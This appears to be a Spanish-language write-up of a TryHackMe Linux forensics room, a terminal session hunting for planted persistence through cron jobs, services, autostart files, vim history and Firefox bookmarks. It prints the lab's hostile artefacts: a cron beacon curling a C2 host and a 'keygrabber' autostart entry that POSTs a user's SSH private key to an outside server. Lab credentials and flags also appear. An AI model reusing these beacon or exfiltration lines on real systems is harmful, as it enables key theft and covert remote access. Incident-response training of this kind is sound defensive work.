## Objetivo
## Pistas
## Solución

```


Username	investigator
Password	TryHackMe123!
IP Address	10.10.176.228

investigator@tryhackme:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@tryhackme:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
investigator@tryhackme:~$ check-env

-----------

investigator@tryhackme:~$ sudo su 
[sudo] password for investigator: 
root@tryhackme:/home/investigator# whoami
root
root@tryhackme:/home/investigator# 

root@tryhackme:/home/investigator# pstree
        ├─cron───cron───sh───abzkd83o4jakxld─┬─cat
        │                                    ├─nc



------


root@tryhackme:/home/investigator# crontab -e
@hourly /etc/cron.hourly/beacon

root@tryhackme:/home/investigator# cat /etc/cron.hourly/beacon
#!/bin/bash

curl http://c2.intelligent-software.thm:8310/beacon
root@tryhackme:/home/investigator# 


root@tryhackme:/home/investigator# cd ../
root@tryhackme:/home# ls
b4ckd00rftw  bill  bob  eduardo  elijah  franklin  investigator  janice  ubuntu
root@tryhackme:/home/bob# crontab -e -u bob
10 05 * * * /home/bob/backup_tmp.sh
30 04 * * * /var/tmp/findme.sh

root@tryhackme:/home/bob# cat /var/tmp/findme.sh
#!/bin/bash

echo "You Found Me!"
root@tryhackme:/home/bob# cd /var/tmp/
root@tryhackme:/var/tmp# ls -al
total 48
drwxrwxrwt  9 root   root   4096 Nov  7 01:23 .
drwxr-xr-x 14 root   root   4096 Feb 27  2022 ..
-rwxr-xr-x  1 root   root    227 Mar 13  2024 b64.sh
-rwxrwxr-x  1 janice janice  111 Mar 12  2024 backup
drwxrwxrwt  2 root   root   4096 Nov  7 01:17 cloud-init
-rwxrwxr-x  1 bob    bob      34 Mar 12  2024 findme.sh
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-ModemManager.service-6Qnwrf
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-switcheroo-control.service-gB9fEf
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-systemd-logind.service-8EHb5e
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-systemd-resolved.service-p8Bgbf
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-systemd-timesyncd.service-ioBXif
drwx------  3 root   root   4096 Nov  7 01:17 systemd-private-8fe067c2b15e4f44a7a03ac0b28867ef-upower.service-UOt2th
root@tryhackme:/var/tmp# cat b64.sh
#!/bin/bash

while true; do
    pkill -f "/bin/sh -c /bin/echo -e 'VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ=='"

    /bin/sh -c "/bin/echo -e 'VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ=='"

    sleep 15
done
root@tryhackme:/var/tmp# 

Vamos al cyberchef
VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ==
THM{851a981445dbfb9485c3771510a53568}
No es la llave
sigamos buscando

root@tryhackme:/home/investigator# cd ../
root@tryhackme:/home# ls
b4ckd00rftw  bill  bob  eduardo  elijah  franklin  investigator  janice  ubuntu
root@tryhackme:/home# cd elijah
root@tryhackme:/home/elijah# ls -al
total 36
drwxr-xr-x  3 elijah elijah 4096 Mar 13  2024 .
drwxr-xr-x 11 root   root   4096 Mar 13  2024 ..
-rw-------  1 elijah elijah  181 Mar 13  2024 .bash_history
-rw-r--r--  1 elijah elijah  220 Mar 12  2024 .bash_logout
-rw-r--r--  1 elijah elijah 3771 Mar 12  2024 .bashrc
-rwxrwxr-x  1 elijah elijah   58 Mar 12  2024 .flag.sh
drwxrwxr-x  3 elijah elijah 4096 Mar 12  2024 .local
-rw-r--r--  1 elijah elijah  807 Mar 12  2024 .profile
-rw-rw-r--  1 elijah elijah   66 Mar 13  2024 .selected_editor
root@tryhackme:/home/elijah# cat flag.sh
cat: flag.sh: No such file or directory
root@tryhackme:/home/elijah# cat .flag.sh
#!/bin/bash

echo "THM{4682786cf2d92f01c4d30a2bbf4621f7}"
root@tryhackme:/home/elijah# 

Resulta que la llave que encontramos era para la siguiente pregunta
THM{851a981445dbfb9485c3771510a53568}
pero igual usemmos el pspy64
root@tryhackme:/home/elijah# pspy64
2024/11/07 02:05:20 CMD: UID=0     PID=3761   | /bin/bash /var/tmp/b64.sh 
2024/11/07 02:05:20 CMD: UID=0     PID=3762   | /bin/sh -c /bin/echo -e 'VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ==' 
2024/11/07 02:05:20 CMD: UID=0     PID=3763   | /bin/echo -e VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ== 
2024/11/07 02:05:20 CMD: UID=0     PID=3764   | sleep 15 

Aqui esta de nuevo

-------------------
Buscamos List all running services on the system en google

systemctl list-units --type=service --state=running

root@tryhackme:/home/elijah# systemctl list-units --type=service --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                     
  accounts-daemon.service                        loaded active running Accounts Service                                                
  acpid.service                                  loaded active running ACPI event daemon                                               
  atd.service                                    loaded active running Deferred execution scheduler                                    
  avahi-daemon.service                           loaded active running Avahi mDNS/DNS-SD Stack                                         
  b4ckd00rftw.service                            loaded active running Backdoor Service - THM{4922066dc6494e8d4d507eef2205c262} 

root@tryhackme:/home/elijah# journalctl | grep b4ckd00rftw 

Nov 07 02:12:21 tryhackme b4ckd00rftw.sh[643]: THM{053c12e620acea8a77b4bdcba578ca19}


----------------------------


root@tryhackme:/home/elijah# cd ../
root@tryhackme:/home# ls 
b4ckd00rftw  bill  bob  eduardo  elijah  franklin  investigator  janice  ubuntu
root@tryhackme:/home# cd janice
root@tryhackme:/home/janice# ls -al
total 48
drwxr-xr-x  5 janice janice 4096 Mar 13  2024 .
drwxr-xr-x 11 root   root   4096 Mar 13  2024 ..
-rw-------  1 janice janice  536 Mar 13  2024 .bash_history
-rw-r--r--  1 janice janice  220 Mar 12  2024 .bash_logout
-rw-r--r--  1 janice janice 3771 Mar 12  2024 .bashrc
drwxrwxr-x  3 janice janice 4096 Mar 13  2024 .config
drwxrwxr-x  3 janice janice 4096 Mar 12  2024 .local
-rw-r--r--  1 janice janice  807 Mar 12  2024 .profile
-rw-rw-r--  1 janice janice   66 Mar 12  2024 .selected_editor
drwx------  2 janice janice 4096 Mar 13  2024 .ssh
-rw-------  1 janice janice  892 Mar 13  2024 .viminfo
-rwxrwxr-x  1 janice janice  380 Mar 13  2024 abzkd83o4jakxld.sh
root@tryhackme:/home/janice# cd .config/
root@tryhackme:/home/janice/.config# ls -al
total 12
drwxrwxr-x 3 janice janice 4096 Mar 13  2024 .
drwxr-xr-x 5 janice janice 4096 Mar 13  2024 ..
drwxrwxr-x 2 janice janice 4096 Mar 13  2024 autostart
root@tryhackme:/home/janice/.config# cat autostart
cat: autostart: Is a directory
root@tryhackme:/home/janice/.config# cd autostart
root@tryhackme:/home/janice/.config/autostart# ls 
keygrabber.desktop
root@tryhackme:/home/janice/.config/autostart# cat keygrabber.desktop
[Desktop Entry]
Type=Application
Name=Standard Desktop Configuration (DO NOT MODIFY)
Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://aabab.best-it-services.thm/id_rsa"
root@tryhackme:/home/janice/.config/autostart# 

root@tryhackme:/home# ls 
b4ckd00rftw  bill  bob  eduardo  elijah  franklin  investigator  janice  ubuntu
root@tryhackme:/home# cat franklin
cat: franklin: Is a directory
root@tryhackme:/home# cd franklin
root@tryhackme:/home/franklin# ls -al
total 36
drwxr-xr-x  4 franklin franklin 4096 Mar 13  2024 .
drwxr-xr-x 11 root     root     4096 Mar 13  2024 ..
-rw-------  1 franklin franklin  470 Mar 13  2024 .bash_history
-rw-r--r--  1 franklin franklin  220 Mar 12  2024 .bash_logout
-rw-r--r--  1 franklin franklin 3771 Mar 12  2024 .bashrc
drwxrwxr-x  3 franklin franklin 4096 Mar 13  2024 .config
drwxrwxr-x  3 franklin franklin 4096 Mar 13  2024 .local
-rw-r--r--  1 franklin franklin  807 Mar 12  2024 .profile
-rw-rw-r--  1 franklin franklin   43 Mar 13  2024 .tmux_history
root@tryhackme:/home/franklin# cd .config/
root@tryhackme:/home/franklin/.config# ls -al
total 12
drwxrwxr-x 3 franklin franklin 4096 Mar 13  2024 .
drwxr-xr-x 4 franklin franklin 4096 Mar 13  2024 ..
drwxrwxr-x 2 franklin franklin 4096 Mar 13  2024 autostart
root@tryhackme:/home/franklin/.config# cd autostart
root@tryhackme:/home/franklin/.config/autostart# ls
netwk.desktop
root@tryhackme:/home/franklin/.config/autostart# cat netwk.desktop
[Desktop Entry]
Type=Application
Name=Show Network Interfaces on Startup
Exec=ifconfig
root@tryhackme:/home/franklin/.config/autostart# 


-------------------------------------


root@tryhackme:/home# ls
b4ckd00rftw  bill  bob  eduardo  elijah  franklin  investigator  janice  ubuntu
root@tryhackme:/home# cd janice
root@tryhackme:/home/janice# ls -al
total 48
drwxr-xr-x  5 janice janice 4096 Mar 13  2024 .
drwxr-xr-x 11 root   root   4096 Mar 13  2024 ..
-rw-------  1 janice janice  536 Mar 13  2024 .bash_history
-rw-r--r--  1 janice janice  220 Mar 12  2024 .bash_logout
-rw-r--r--  1 janice janice 3771 Mar 12  2024 .bashrc
drwxrwxr-x  3 janice janice 4096 Mar 13  2024 .config
drwxrwxr-x  3 janice janice 4096 Mar 12  2024 .local
-rw-r--r--  1 janice janice  807 Mar 12  2024 .profile
-rw-rw-r--  1 janice janice   66 Mar 12  2024 .selected_editor
drwx------  2 janice janice 4096 Mar 13  2024 .ssh
-rw-------  1 janice janice  892 Mar 13  2024 .viminfo
-rwxrwxr-x  1 janice janice  380 Mar 13  2024 abzkd83o4jakxld.sh
root@tryhackme:/home/janice# cat .viminfo
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/THM{4a8fd984228d89999342d189e6b916de}

# Command Line History (newest to oldest):
:q
|2,0,1710339077,,"q"

# Search String History (newest to oldest):
?/THM{4a8fd984228d89999342d189e6b916de}
|2,1,1710339063,47,"THM{4a8fd984228d89999342d189e6b916de}"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  1  0  /tmp/exfil.txt
|4,48,1,0,1710339077,"/tmp/exfil.txt"

# Jumplist (newest first):
-'  1  0  /tmp/exfil.txt
|4,39,1,0,1710339077,"/tmp/exfil.txt"

# History of marks within files (newest to oldest):

> /tmp/exfil.txt
*17103390750
"10
root@tryhackme:/home/janice# 


root@tryhackme:/home/investigator# python3 dumpzilla.py
usage: python dumpzilla.py PROFILE_DIR [OPTIONS]

Options:

 --Addons
 --Search
 --Bookmarks [-bm_create_range <start> <end>][-bm_last_range <start> <end>]
 --Certoverride
 --Cookies [-showdom] [-domain <string>] [-name <string>] [-hostcookie <string>] [-access <date>] [-create <date>]
           [-secure <0|1>] [-httponly <0|1>] [-last_range <start> <end>] [-create_range <start> <end>]
 --Downloads [-range <start> <end>]
 --Export <directory> (export data as json)
 --Forms [-value <string>] [-forms_range <start> <end>]
 --Help (shows this help message and exit)
 --History [-url <string>] [-title <string>] [-date <date>] [-history_range <start> <end>] [-frequency]
 --Keypinning [-entry_type <HPKP|HSTS>]
 --OfflineCache [-cache_range <start> <end> -extract <directory>]
 --Preferences
 --Passwords
 --Permissions [-host <string>] [-modif <date>] [-modif_range <start> <end>]
 --RegExp (use Regular Expresions for string type filters instead of Wildcards)
 --Session
 --Summary (no data extraction, only summary report)
 --Thumbnails [-extract_thumb <directory>]
 --Verbosity (DEBUG|INFO|WARNING|ERROR|CRITICAL)
 --Watch [-text <string>] (shows in daemon mode the URLs and text form in real time; Unix only)

Wildcards (without RegExp option):

 '%'  Any string of any length (including zero length)
 '_'  Single character
 '\'  Escape character

Regular Expresions: https://docs.python.org/3/library/re.html

Date syntax:

 YYYY-MM-DD hh:mi:ss (wildcards allowed)

Profile location:

 WinXP profile -> 'C:\Documents and Settings\%USERNAME%\Application Data\Mozilla\Firefox\Profiles\xxxx.default'
 Win7 profile  -> 'C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default'
 MacOS profile -> '/Users/$USER/Library/Application\ Support/Firefox/Profiles/xxxx.default'
 Unix profile  -> '/home/$USER/.mozilla/firefox/xxxx.default'
   
dumpzilla.py: error: the following arguments are required: PROFILE_DIR
root@tryhackme:/home/investigator# python3 dumpzilla.py --Bookmarks
usage: python dumpzilla.py PROFILE_DIR [OPTIONS]

Options:

 --Addons
 --Search
 --Bookmarks [-bm_create_range <start> <end>][-bm_last_range <start> <end>]
 --Certoverride
 --Cookies [-showdom] [-domain <string>] [-name <string>] [-hostcookie <string>] [-access <date>] [-create <date>]
           [-secure <0|1>] [-httponly <0|1>] [-last_range <start> <end>] [-create_range <start> <end>]
 --Downloads [-range <start> <end>]
 --Export <directory> (export data as json)
 --Forms [-value <string>] [-forms_range <start> <end>]
 --Help (shows this help message and exit)
 --History [-url <string>] [-title <string>] [-date <date>] [-history_range <start> <end>] [-frequency]
 --Keypinning [-entry_type <HPKP|HSTS>]
 --OfflineCache [-cache_range <start> <end> -extract <directory>]
 --Preferences
 --Passwords
 --Permissions [-host <string>] [-modif <date>] [-modif_range <start> <end>]
 --RegExp (use Regular Expresions for string type filters instead of Wildcards)
 --Session
 --Summary (no data extraction, only summary report)
 --Thumbnails [-extract_thumb <directory>]
 --Verbosity (DEBUG|INFO|WARNING|ERROR|CRITICAL)
 --Watch [-text <string>] (shows in daemon mode the URLs and text form in real time; Unix only)

Wildcards (without RegExp option):

 '%'  Any string of any length (including zero length)
 '_'  Single character
 '\'  Escape character

Regular Expresions: https://docs.python.org/3/library/re.html

Date syntax:

 YYYY-MM-DD hh:mi:ss (wildcards allowed)

Profile location:

 WinXP profile -> 'C:\Documents and Settings\%USERNAME%\Application Data\Mozilla\Firefox\Profiles\xxxx.default'
 Win7 profile  -> 'C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default'
 MacOS profile -> '/Users/$USER/Library/Application\ Support/Firefox/Profiles/xxxx.default'
 Unix profile  -> '/home/$USER/.mozilla/firefox/xxxx.default'
   
dumpzilla.py: error: the following arguments are required: PROFILE_DIR
root@tryhackme:/home/investigator# python3 dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release/ --Bookmarks

=============================================================================================================
== Bookmarks            
============================================================================================================
=> Source file: /home/eduardo/.mozilla/firefox/niijyovp.default-release/places.sqlite
=> SHA256 hash: 8340f5f9c5aeb5b0fbee1582e1b60ce022c02f041201ba435773335285ab3cd1

Title: 
URL: https://www.mozilla.org/privacy/firefox/
Creation Time: 2022-02-27 15:17:09
Last Modified: 2024-03-13 14:38:47

Title: menu
URL: https://www.mozilla.org/en-US/privacy/firefox/
Creation Time: 2022-02-27 15:17:09
Last Modified: 2022-02-27 15:17:09

Title: toolbar
URL: https://start.ubuntu-mate.org/
Creation Time: 2022-02-27 15:17:09
Last Modified: 2024-03-13 14:38:47

Title: tags
URL: https://www.mate-look.org/p/1181106/
Creation Time: 2022-02-27 15:17:09
Last Modified: 2022-02-27 15:17:09

Title: unfiled
URL: https://dl3.pling.com/api/files/download/j/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTUwMDcyNzA0OSwidSI6bnVsbCwibHQiOiJkb3dubG9hZCIsInMiOiIwYTFiNzYyO
Tg1OTc5ZGQ3YWY4OWI4MjFmYmFmYTg3MjQ1NmYxNDNhMDcwYjg0MWU3Y2JkYTE1OTJlMTdlZjgyZGQ3YTRlZDYwMzZhNDRkZTgwM2I4NTkwODU1YWIzZjQ4OTUwNzIxMDVjZjU3MmFmYzViMjE0NzQwYWZmZDU
yOSIsInQiOjE2NDU5ODM2MzYsInN0ZnAiOiIyZDgzMDJlZGEzMWZjYmY2OTc3N2VkYjM4NGJmOTg0NCIsInN0aXAiOiIzNC4yNTQuMTU5LjE4MSJ9._w0Ik-bmcmhE60Nz39PTYES3Wrg5geiRBZz7tT-jJVg/
Arc-Dark.tar.xz
Creation Time: 2022-02-27 15:17:09
Last Modified: 2022-02-27 15:17:09

Title: mobile
URL: https://tryhackme.com/?flag=THM{5d5cb0ffe8369ab08f1e90aa9e9bc24e}
Creation Time: 2022-02-27 15:17:09
Last Modified: 2022-02-27 15:17:09

Title: THM{5d5cb0ffe8369ab08f1e90aa9e9bc24e}
URL: https://tryhackme.com/?flag=https://tryhackme.com?flag=THM{5d5cb0ffe8369ab08f1e90aa9e9bc24e}
Creation Time: 2024-03-13 14:23:09
Last Modified: 2024-03-13 14:23:09

Title: Ubuntu Start Page
URL: http://facebook.com/
Creation Time: 2024-03-13 14:38:25
Last Modified: 2024-03-13 14:38:25

Title: Log into Facebook
URL: https://facebook.com/
Creation Time: 2024-03-13 14:38:36
Last Modified: 2024-03-13 14:38:36

Title: LinkedIn: Log In or Sign Up
URL: https://www.facebook.com/
Creation Time: 2024-03-13 14:38:47
Last Modified: 2024-03-13 14:38:47


===============================================================================================================
== Total Information
==============================================================================================================

Total Bookmarks            : 10

root@tryhackme:/home/investigator# 


```
## Notas adicionales
## Referencias